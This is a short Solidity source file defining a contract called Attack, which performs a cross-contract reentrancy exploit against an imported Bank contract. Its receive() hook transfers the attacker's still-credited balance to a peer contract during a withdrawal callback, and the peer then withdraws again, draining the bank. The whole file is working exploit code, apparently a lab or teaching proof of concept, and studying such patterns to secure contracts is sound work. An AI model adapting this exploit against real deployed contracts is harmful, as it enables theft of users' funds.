// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Bank} from "./Bank.sol";

contract Attack {
    Bank public immutable bank;
    Attack public attackPeer;

    constructor(Bank _bank) {
        bank = _bank;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.transfer(
                address(attackPeer), 
                bank.userBalance(address(this))
            );
        }
    }

    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function attackNext() external {
        bank.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}